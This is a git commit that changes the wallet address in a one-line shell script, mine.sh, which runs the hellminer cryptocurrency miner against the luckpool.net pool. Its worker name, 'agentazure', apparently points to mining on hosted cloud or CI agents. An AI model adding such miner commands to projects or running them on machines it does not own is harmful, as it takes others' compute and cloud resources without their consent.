a62d6aaab5086b20802d76c69a25c5a101ea395a
matadywa88 <116230235+matadywa88@users.noreply.github.com>
2022-10-22 23:34:05 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,1 +1,1 @@
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RXjdc9KVf7c51DzUtoYZvoTm2hHBTbMPZm.agentazure -p x --cpu 1
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RGCpqtUaettRHbJAFRMg5s3MMwx1ehweo8.agentazure -p x --cpu 1
